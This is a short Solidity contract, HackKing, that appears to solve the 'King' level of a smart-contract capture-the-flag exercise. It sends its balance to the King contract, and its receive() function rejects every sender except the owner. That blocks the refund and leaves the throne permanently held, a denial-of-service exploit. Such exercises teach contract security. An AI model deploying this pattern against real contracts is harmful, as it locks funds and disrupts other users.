// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract HackKing {
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;
  }

  function payKing(address payable _to) public {
    King king = King(_to);
    address(king).call{value: address(this).balance}("");
  }

  function balance() public view returns (uint) {
    return address(this).balance;
  }

  receive() external payable {
    require(msg.sender == owner);
  }
}